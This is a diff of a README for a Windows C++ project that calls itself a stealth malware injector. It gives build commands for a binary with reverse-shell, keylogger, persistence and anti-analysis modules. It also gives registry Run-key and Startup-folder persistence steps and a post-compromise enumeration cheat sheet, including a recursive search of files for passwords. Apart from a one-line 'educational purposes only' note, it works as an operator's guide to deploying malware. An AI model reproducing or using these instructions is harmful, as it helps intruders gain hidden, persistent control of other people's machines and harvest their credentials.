@@ -1,295 +1,330 @@
-compile without keylogger g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static
+# Malware Stealth Injector
 
-everything tested and working with 
-g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static
+## Project Overview
+This program is a stealth malware injector designed to evade analysis, maintain persistence, and establish reverse shell connections. The code leverages various anti-analysis techniques, persistence mechanisms, and remote command execution capabilities.
 
+### Key Features
+- **Stealth Execution**: Runs as a hidden process.
+- **Anti-Analysis**: Checks for debuggers, sandboxes, and virtual machines to avoid detection.
+- **Persistence**: Ensures the malware is executed during system startup.
+- **Reverse Shell**: Establishes a reverse shell connection to a specified C2 server.
 
+## File Structure
+```
+ProjectDirectory/
+│
+├── include/
+│   ├── main.h
+│   ├── Authenticator.h
+│   ├── Utilities.h
+│   ├── Paths.h
+│   ├── AnalysisEvasion.h
+│   └── ReverseShell.h
+│
+└── src/
+    ├── main.cpp
+    ├── Authenticator.cpp
+    ├── Utilities.cpp
+    ├── Paths.cpp
+    ├── AnalysisEvasion.cpp
+    ├── persistence.cpp
+    └── ReverseShell.cpp
+```
 
-compile command tested to run console not in view g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static -mwindows
+## Compilation Instructions
 
+Compile the project using the following `g++` command:
 
+```bash
+g++ -Wno-deprecated-declarations \
+    -IC:/mingw64/include \
+    -IC:/crypto \
+    -IC:/fmt-11.0.2/fmt-11.0.2/include \
+    -IC:/Users/alexa/json/include \
+    -I. \
+    -LC:/mingw64/lib \
+    -LC:/OpenSSL-Win64/lib/VC/x64/MD \
+    -LC:/curl-8.11.0_1-win64-mingw/lib \
+    -o malware.exe \
+    main.cpp ReverseShell.cpp Utilities.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp \
+    -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static
+```
 
-ReverseShell
+## How to Use This Tool
 
-g++ -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -o malware.exe keylogger.cpp main.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp
+### 1. Persistence
+Ensure the malware persists across system reboots by adding it to the registry and startup folder.
 
+#### Add to Registry
+```bash
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "malware" /t REG_SZ /d "C:\ProgramData\malware.exe"
+```
 
-
-
-g++ -Wno-deprecated-declarations -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware.exe main.cpp ReverseShell.cpp keylogger.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp
-
-
-
-
-persistence
-check to verify it's in place
+#### Verify Registry Entry
+```bash
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+```
 
+#### Copy Executable to System Location
+```bash
 copy "C:\Users\johns\Downloads\malware.exe" "C:\ProgramData\malware.exe"
+```
 
-3. Startup Folder
-Copy malware.exe to the Startup folder to execute it when the user logs in.
-
-Command:
-cmd
-Copy code
+### Add to Startup Folder
+```bash
 copy "C:\Users\shiti\Downloads\malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"
+```
 
+### 2. System Information
 
-1. System Information
-General System Info:
-
-cmd
-Copy code
+#### General System Info
+```bash
 systeminfo
-Operating System Version:
+```
 
-cmd
-Copy code
+#### Operating System Version
+```bash
 ver
-Detailed OS Info:
+```
 
-cmd
-Copy code
+#### Detailed OS Info
+```bash
 wmic os get Caption, Version, BuildNumber, OSArchitecture
-BIOS Information:
+```
 
-cmd
-Copy code
+#### BIOS Information
+```bash
 wmic bios get Manufacturer, Version, SerialNumber
-System Boot Time:
+```
 
-cmd
-Copy code
+#### System Boot Time
+```bash
 wmic os get LastBootUpTime
-List Environment Variables:
+```
 
-cmd
-Copy code
+#### List Environment Variables
+```bash
 set
-🔹 2. User and Group Enumeration
-List All Users:
+```
 
-cmd
-Copy code
+### 3. User and Group Enumeration
+
+#### List All Users
+```bash
 net user
-Detailed User Info:
+```
 
-cmd
-Copy code
+#### Detailed User Info
+```bash
 net user [username]
-List All Groups:
+```
 
-cmd
-Copy code
+#### List All Groups
+```bash
 net localgroup
-Members of Administrators Group:
+```
 
-cmd
-Copy code
+#### Members of Administrators Group
+```bash
 net localgroup administrators
-Current Logged-in User:
+```
 
-cmd
-Copy code
+#### Current Logged-in User
+```bash
 whoami
-List User Privileges:
+```
 
-cmd
-Copy code
+#### List User Privileges
+```bash
 whoami /priv
-Domain Info (if domain-joined):
+```
 
-cmd
-Copy code
+#### Domain Info (if domain-joined)
+```bash
 net config workstation
-🔹 3. Password Policies
-View Local Password Policy:
+```
 
-cmd
-Copy code
-net accounts
-Check Account Lockout Policy:
+### 4. Network Enumeration
 
-cmd
-Copy code
-net accounts
-List Password Policies via secedit:
-
-cmd
-Copy code
-secedit /export /cfg C:\policy.txt
-type C:\policy.txt
-🔹 4. Network Enumeration
-IP Configuration:
-
-cmd
-Copy code
+#### IP Configuration
+```bash
 ipconfig /all
-List Open Ports:
+```
 
-cmd
-Copy code
+#### List Open Ports
+```bash
 netstat -an
-List Active Connections:
+```
 
-cmd
-Copy code
+#### List Active Connections
+```bash
 netstat -ano
-ARP Table:
+```
 
-cmd
-Copy code
+#### ARP Table
+```bash
 arp -a
-Routing Table:
+```
 
-cmd
-Copy code
+#### Routing Table
+```bash
 route print
-Network Shares:
+```
 
-cmd
-Copy code
+#### Network Shares
+```bash
 net share
-Mapped Drives:
+```
 
-cmd
-Copy code
+#### Mapped Drives
+```bash
 net use
-DNS Cache:
+```
 
-cmd
-Copy code
+#### DNS Cache
+```bash
 ipconfig /displaydns
-Firewall Configuration:
+```
 
-cmd
-Copy code
+#### Firewall Configuration
+```bash
 netsh firewall show state
-🔹 5. Installed Applications and Updates
-List Installed Programs:
+```
 
-cmd
-Copy code
+### 5. Installed Applications and Updates
+
+#### List Installed Programs
+```bash
 wmic product get Name, Version
-List Installed Hotfixes/Updates:
+```
 
-cmd
-Copy code
+#### List Installed Hotfixes/Updates
+```bash
 wmic qfe get Description, HotFixID, InstalledOn
-List Startup Programs:
+```
 
-cmd
-Copy code
+#### List Startup Programs
+```bash
 wmic startup get Caption, Command
-🔹 6. Services and Processes
-List All Services:
+```
 
-cmd
-Copy code
+### 6. Services and Processes
+
+#### List All Services
+```bash
 sc query state= all
-List Running Processes:
+```
 
-cmd
-Copy code
+#### List Running Processes
+```bash
 tasklist
-Detailed Process Info:
+```
 
-cmd
-Copy code
+#### Detailed Process Info
+```bash
 wmic process get Name, ProcessId, CommandLine
-Check Scheduled Tasks:
+```
 
-cmd
-Copy code
+#### Check Scheduled Tasks
+```bash
 schtasks /query /fo LIST /v
-🔹 7. File and Directory Enumeration
-List Files and Directories (Recursive):
+```
 
-cmd
-Copy code
+### 7. File and Directory Enumeration
+
+#### List Files and Directories (Recursive)
+```bash
 dir /s
-List Hidden Files:
+```
 
-cmd
-Copy code
+#### List Hidden Files
+```bash
 dir /a:h
-Find Files Containing Keywords:
+```
 
-cmd
-Copy code
+#### Find Files Containing Keywords
+```bash
 findstr /s /i "password" *.*
-Check File Permissions:
+```
 
-cmd
-Copy code
+#### Check File Permissions
+```bash
 icacls [filename]
-Search for Executable Files:
+```
 
-cmd
-Copy code
+#### Search for Executable Files
+```bash
 dir *.exe /s /b
-🔹 8. Security Policies and Configuration
-Local Security Policy Export:
+```
 
-cmd
-Copy code
+### 8. Security Policies and Configuration
+
+#### Local Security Policy Export
+```bash
 secedit /export /cfg C:\security_policy.cfg
-Group Policy Results:
+```
 
-cmd
-Copy code
+#### Group Policy Results
+```bash
 gpresult /v
-Audit Policy:
+```
 
-cmd
-Copy code
+#### Audit Policy
+```bash
 auditpol /get /category:*
-Registry Autoruns:
+```
 
-cmd
-Copy code
+#### Registry Autoruns
+```bash
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-🔹 9. Windows Event Logs
-System Logs:
+```
 
-cmd
-Copy code
+### 9. Windows Event Logs
+
+#### System Logs
+```bash
 wevtutil qe System /c:5 /f:text
-Security Logs:
+```
 
-cmd
-Copy code
+#### Security Logs
+```bash
 wevtutil qe Security /c:5 /f:text
-Application Logs:
+```
 
-cmd
-Copy code
+#### Application Logs
+```bash
 wevtutil qe Application /c:5 /f:text
-🔹 10. Miscellaneous Commands
-Disk Usage and Free Space:
+```
 
-cmd
-Copy code
+### 10. Miscellaneous Commands
+
+#### Disk Usage and Free Space
+```bash
 fsutil volume diskfree C:
-Check System Uptime:
+```
 
-cmd
-Copy code
+#### Check System Uptime
+```bash
 net stats srv
-System Drives Info:
+```
 
-cmd
-Copy code
+#### System Drives Info
+```bash
 wmic logicaldisk get DeviceID, FileSystem, FreeSpace, Size, VolumeName
-Check for Open Files:
+```
 
-cmd
-Copy code
+#### Check for Open Files
+```bash
 openfiles /query
-View Running Services:
+```
 
-cmd
-Copy code
+#### View Running Services
+```bash
 tasklist /svc
+```
+
+---
+
+## Notes
+This program is intended for **educational purposes only**. Use it responsibly and ensure you have permission before testing it on any system.
